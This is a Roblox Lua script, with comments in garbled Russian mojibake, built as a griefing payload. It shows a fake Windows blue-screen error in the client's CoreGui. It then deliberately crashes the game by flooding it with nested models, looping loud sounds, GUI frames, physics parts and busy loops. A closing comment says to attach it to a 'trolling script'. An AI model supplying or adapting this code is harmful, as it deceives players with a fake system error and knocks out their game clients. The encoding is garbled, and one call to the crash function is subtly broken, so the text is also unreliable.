-- ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà –°–ò–ù–ò–ô –≠–ö–†–ê–ù –°–ú–ï–†–¢–ò WINDOWS –í ROBLOX ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
local function blueScreenOfDeath()
    -- –°–æ–∑–¥–∞–µ–º –ø–æ–ª–Ω–æ—ç–∫—Ä–∞–Ω–Ω—ã–π —Å–∏–Ω–∏–π —Ñ–æ–Ω
    local gui = Instance.new("ScreenGui")
    gui.Name = "BlueScreenOfDeath"
    gui.Parent = game:GetService("CoreGui")
    gui.ResetOnSpawn = false

    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 170)  -- –ö–ª–∞—Å—Å–∏—á–µ—Å–∫–∏–π —Å–∏–Ω–∏–π —Ü–≤–µ—Ç BSOD
    background.BorderSizePixel = 0
    background.ZIndex = 99999
    background.Parent = gui

    -- –°–æ–¥–µ—Ä–∂–∏–º–æ–µ —Å–∏–Ω–µ–≥–æ —ç–∫—Ä–∞–Ω–∞
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, 0, 1, 0)
    content.Position = UDim2.new(0, 0, 0, 0)
    content.BackgroundTransparency = 1
    content.ZIndex = 100000
    content.Parent = gui

    -- –ò–∫–æ–Ω–∫–∞ –≥—Ä—É—Å—Ç–Ω–æ–≥–æ —Å–º–∞–π–ª–∏–∫–∞
    local emoji = Instance.new("TextLabel")
    emoji.Text = "üò¢"
    emoji.Size = UDim2.new(0, 100, 0, 100)
    emoji.Position = UDim2.new(0, 50, 0, 50)
    emoji.TextSize = 80
    emoji.TextColor3 = Color3.new(1, 1, 1)
    emoji.BackgroundTransparency = 1
    emoji.ZIndex = 100001
    emoji.Parent = content

    -- –ó–∞–≥–æ–ª–æ–≤–æ–∫ –æ—à–∏–±–∫–∏
    local title = Instance.new("TextLabel")
    title.Text = "CRITICAL_PROCESS_DIED"
    title.Size = UDim2.new(1, -200, 0, 40)
    title.Position = UDim2.new(0, 170, 0, 50)
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 24
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.BackgroundTransparency = 1
    title.ZIndex = 100001
    title.Parent = content

    -- –û–ø–∏—Å–∞–Ω–∏–µ –æ—à–∏–±–∫–∏
    local description = Instance.new("TextLabel")
    description.Text = "Your Roblox client ran into a problem and needs to restart.\nWe're just collecting some error info, and then we'll restart for you."
    description.Size = UDim2.new(1, -200, 0, 60)
    description.Position = UDim2.new(0, 170, 0, 90)
    description.TextColor3 = Color3.new(1, 1, 1)
    description.Font = Enum.Font.Gotham
    description.TextSize = 18
    description.TextXAlignment = Enum.TextXAlignment.Left
    description.TextYAlignment = Enum.TextYAlignment.Top
    description.BackgroundTransparency = 1
    description.ZIndex = 100001
    description.Parent = content

    -- –ö–æ–¥ –æ—à–∏–±–∫–∏ (—Å–ª—É—á–∞–π–Ω—ã–π)
    local errorCode = Instance.new("TextLabel")
    errorCode.Text = "Stop code: CRITICAL_PROCESS_DIED\nError: 0x" .. string.format("%08X", math.random(0, 0xFFFFFFFF))
    errorCode.Size = UDim2.new(1, -200, 0, 40)
    errorCode.Position = UDim2.new(0, 170, 0, 160)
    errorCode.TextColor3 = Color3.new(1, 1, 1)
    errorCode.Font = Enum.Font.Gotham
    errorCode.TextSize = 16
    errorCode.TextXAlignment = Enum.TextXAlignment.Left
    errorCode.BackgroundTransparency = 1
    errorCode.ZIndex = 100001
    errorCode.Parent = content

    -- –ü—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä
    local progressFrame = Instance.new("Frame")
    progressFrame.Size = UDim2.new(1, -200, 0, 20)
    progressFrame.Position = UDim2.new(0, 170, 0, 210)
    progressFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.5)
    progressFrame.BorderSizePixel = 0
    progressFrame.ZIndex = 100001
    progressFrame.Parent = content

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.new(1, 1, 1)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 100002
    progressBar.Parent = progressFrame

    -- QR –∫–æ–¥ (—Ñ–µ–π–∫–æ–≤—ã–π)
    local qrText = Instance.new("TextLabel")
    qrText.Text = "For more information about this issue and possible fixes, visit https://www.roblox.com/support\n\nIf you call a support person, give them this info:\nStop code: CRITICAL_PROCESS_DIED"
    qrText.Size = UDim2.new(1, -200, 0, 100)
    qrText.Position = UDim2.new(0, 170, 0, 240)
    qrText.TextColor3 = Color3.new(1, 1, 1)
    qrText.Font = Enum.Font.Gotham
    qrText.TextSize = 14
    qrText.TextXAlignment = Enum.TextXAlignment.Left
    qrText.TextYAlignment = Enum.TextYAlignment.Top
    qrText.BackgroundTransparency = 1
    qrText.ZIndex = 100001
    qrText.Parent = content

    -- –ê–Ω–∏–º–∞—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä–∞
    spawn(function()
        for i = 0, 100, 2 do
            progressBar.Size = UDim2.new(i/100, 0, 1, 0)
            wait(0.1)
        end
        
        -- –ü–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä–∞ –∑–∞–ø—É—Å–∫–∞–µ–º –∫—Ä–∞—à
        wait(2)
        crashRoblox()
    end)

    return gui
end

-- ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà –§–£–ù–ö–¶–ò–Ø –ö–†–ê–®–ê ROBLOX ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
local function crashRoblox()
    print("üí• –ó–∞–ø—É—Å–∫ –ø–æ–ª–Ω–æ–≥–æ –∫—Ä–∞—à–∞ Roblox...")
    
    -- –ú–µ—Ç–æ–¥ 1: –ë–µ—Å–∫–æ–Ω–µ—á–Ω–∞—è —Ä–µ–∫—É—Ä—Å–∏—è —Å —Å–æ–∑–¥–∞–Ω–∏–µ–º –æ–±—ä–µ–∫—Ç–æ–≤
    local function createNestedModels(depth)
        if depth > 1000 then return end
        
        local model = Instance.new("Model")
        model.Name = "CrashModel_" .. depth
        model.Parent = workspace
        
        for i = 1, 10 do
            local part = Instance.new("Part")
            part.Name = "CrashPart_" .. depth .. "_" .. i
            part.Size = Vector3.new(10, 10, 10)
            part.Position = Vector3.new(i * 5, depth * 2, 0)
            part.Anchored = true
            part.Parent = model
            
            -- –î–æ–±–∞–≤–ª—è–µ–º —Å–ª–æ–∂–Ω—ã–µ —Å–≤–æ–π—Å—Ç–≤–∞ –¥–ª—è –ø–µ—Ä–µ–≥—Ä—É–∑–∫–∏
            for j = 1, 5 do
                local value = Instance.new("StringValue")
                value.Name = "CrashValue_" .. j
                value.Value = string.rep("X", 1000)
                value.Parent = part
            end
        end
        
        -- –†–µ–∫—É—Ä—Å–∏–≤–Ω—ã–π –≤—ã–∑–æ–≤
        spawn(function()
            createNestedModels(depth + 1)
        end)
    end

    -- –ú–µ—Ç–æ–¥ 2: –ü–µ—Ä–µ–≥—Ä—É–∑–∫–∞ –∑–≤—É–∫–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã
    local function overloadAudio()
        while true do
            for i = 1, 50 do
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://107921759971053"  -- –í–∞—à –∑–≤—É–∫ —Å–∏—Ä–µ–Ω—ã
                sound.Volume = 10
                sound.Looped = true
                sound.Parent = workspace
                sound:Play()
            end
            wait(0.01)
        end
    end

    -- –ú–µ—Ç–æ–¥ 3: –ü–µ—Ä–µ–≥—Ä—É–∑–∫–∞ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
    local function overloadGUI()
        while true do
            local gui = Instance.new("ScreenGui")
            gui.Parent = game:GetService("CoreGui")
            
            for i = 1, 100 do
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, math.random(-100,100), 1, math.random(-100,100))
                frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
                frame.BackgroundTransparency = math.random()
                frame.Parent = gui
                
                for j = 1, 10 do
                    local label = Instance.new("TextLabel")
                    label.Text = "CRASHING... " .. math.random(10000)
                    label.Size = UDim2.new(1, 0, 1, 0)
                    label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
                    label.BackgroundTransparency = 1
                    label.Parent = frame
                end
            end
            wait(0.01)
        end
    end

    -- –ú–µ—Ç–æ–¥ 4: –§–∏–∑–∏—á–µ—Å–∫–∞—è –ø–µ—Ä–µ–≥—Ä—É–∑–∫–∞
    local function overloadPhysics()
        game:GetService("Workspace").Gravity = 196.2 * 5  -- –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –≥—Ä–∞–≤–∏—Ç–∞—Ü–∏—é
        
        while true do
            -- –°–æ–∑–¥–∞–µ–º –º–Ω–æ–≥–æ —Ñ–∏–∑–∏—á–µ—Å–∫–∏—Ö –æ–±—ä–µ–∫—Ç–æ–≤
            for i = 1, 100 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(5, 5, 5)
                part.Position = Vector3.new(math.random(-100,100), 50, math.random(-100,100))
                part.Velocity = Vector3.new(math.random(-100,100), math.random(0,100), math.random(-100,100))
                part.Parent = workspace
            end
            wait(0.01)
        end
    end

    -- –ó–∞–ø—É—Å–∫–∞–µ–º –≤—Å–µ –º–µ—Ç–æ–¥—ã –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ
    spawn(function() createNestedModels(1) end)
    spawn(overloadAudio)
    spawn(overloadGUI)
    spawn(overloadPhysics)
    
    -- –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –º–µ—Ç–æ–¥—ã –∫—Ä–∞—à–∞
    while true do
        -- –ú–µ–Ω—è–µ–º —Å–≤–æ–π—Å—Ç–≤–∞ —Å—Ä–µ–¥—ã
        game:GetService("Lighting").TimeOfDay = tostring(math.random(0,24))
        game:GetService("Lighting").Brightness = math.random(0, 10)
        game:GetService("Lighting").GlobalShadows = math.random() > 0.5
        
        -- –õ–∞–≥–∏–º –≥–ª–∞–≤–Ω—ã–π –ø–æ—Ç–æ–∫
        for i = 1, 1000000 do end
        
        wait(0.1)
    end
end

-- ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà –§–£–ù–ö–¶–ò–Ø –í–´–ó–û–í–ê –°–ò–ù–ï–ì–û –≠–ö–†–ê–ù–ê ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
local function triggerBlueScreen()
    -- –°–Ω–∞—á–∞–ª–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω
    local bsod = blueScreenOfDeath()
    
    -- –ß–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥ –∑–∞–ø—É—Å–∫–∞–µ–º –∫—Ä–∞—à
    wait(5)
    crashRoblox()
end

-- ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò–ô –ó–ê–ü–£–°–ö ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
-- –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥ –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∫—Ä–∏–ø—Ç–∞
wait(10)
triggerBlueScreen()

-- ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà –î–û–ë–ê–í–õ–Ø–ï–ú –≠–¢–û–¢ –ö–û–î –í –ö–û–ù–ï–¶ –¢–†–û–õ–õ–ò–ù–ì-–°–ö–†–ò–ü–¢–ê ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
-- –ü–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç—Ä–æ–ª–ª–∏–Ω–≥-—Å–∫—Ä–∏–ø—Ç–∞ –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω –∏ –∫—Ä–∞—à
